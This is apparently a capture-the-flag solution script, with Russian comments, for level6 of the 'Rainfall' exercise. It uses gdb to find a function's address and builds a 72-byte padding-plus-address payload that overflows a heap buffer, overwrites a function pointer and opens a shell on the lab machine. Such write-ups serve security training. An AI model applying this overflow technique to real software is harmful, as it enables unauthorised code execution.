# 1. Запустить программу в дебаггере
# 2. Найти функции main, m и n
# 3. Шелл открывается в n, но n не вызывается, вызывается только m, для чего создаётся указатель на неё
# 4. Найти последовательные вызовы malloc - один для копирования поданной аргументом строки, другой для адреса функции
# 6. Создать строку размером выделенной памяти первого malloc, добавить к ней адрес n
# 8. Запустить программу со этой строкой и получить пароль

ssh level6@"$RAINFALL_IP" -p 4242 '
    # нахождение адресов функций
    N_ADDRESS=$(gdb --batch -ex "x/i n" ./level6 | awk "{print substr(\$1, 3)}")
    # создание строки
    if ((${#N_ADDRESS} % 2 == 1)); then N_ADDRESS="0${N_ADDRESS}"; fi
    N_ADDRESS="\x${N_ADDRESS:6:2}\x${N_ADDRESS:4:2}\x${N_ADDRESS:2:2}\x${N_ADDRESS:0:2}"
    python -c "print \"x\" * 72 + \"$N_ADDRESS\"" > /tmp/level6
    # запуск программы и получение флага
    ./level6 $(cat /tmp/level6)
'
